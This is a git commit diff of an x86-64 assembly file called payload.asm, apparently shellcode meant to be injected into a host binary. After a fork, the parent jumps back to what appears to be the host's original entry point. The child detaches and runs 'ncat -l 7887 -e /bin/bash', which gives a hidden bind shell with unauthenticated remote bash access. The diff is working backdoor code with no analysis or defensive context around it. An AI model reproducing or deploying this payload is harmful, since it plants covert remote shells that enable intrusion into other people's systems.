5d855da1684be89f35f946574662f931d19085a4
Artem Vang <vangogius@gmail.com>
2018-11-01 22:17:41 +0200

    update payload to start netcat server

--- payload.asm
+++ payload.asm
@@ -1,21 +1,29 @@
 section .text
     global _start
 
-time:
-
 _start:
-
     push rax
     push rdi
     push rsi
     push rdx
+    push rbx
 
-    mov rax, 59
-    lea rdi, [rel exec_file]
-    lea rsi, [rel argv]
-    xor rdx, rdx
+    mov rax, 57
     syscall
 
+    lea rbx, [rel child]
+    lea rdi, [rel parent]
+
+    sub rbx, rdi
+    neg rax
+    sbb rax, rax
+    inc rax
+    mul rbx
+    add rax, rdi
+    jmp rax
+
+parent:
+    pop rbx
     pop rdx
     pop rsi
     pop rdi
@@ -25,8 +33,41 @@ _start:
     sub rax, 0x11111111
     jmp rax
 
-exec_file db "/bin/nc", 0x0
-arg0 db "/bin/nc", 0x0
+    mov rax, 60
+    mov rdi, 0
+    syscall
+
+child:
+    mov rax, 3
+    mov rdi, 0
+    syscall
+
+    mov rax, 3
+    mov rdi, 1
+    syscall
+
+    mov rax, 3
+    mov rdi, 2
+    syscall
+
+    mov rax, 112
+    syscall
+
+    mov rax, 59
+    lea rdi, [rel exec_file]
+    lea rsi, [rel argv]
+    xor rdx, rdx
+    syscall
+
+    mov rax, 60
+    mov rdi, 0
+    syscall
+
+
+exec_file db "/usr/bin/ncat", 0x0
+arg0 db "/usr/bin/ncat", 0x0
 arg1 db "-l", 0x0
 arg2 db "7887", 0x0
-argv dd arg0, arg1, arg2, 0x0
+arg3 db "-e", 0x0
+arg4 db "/bin/bash", 0x0
+argv dq arg0, arg1, arg2, arg3, arg4, 0x0
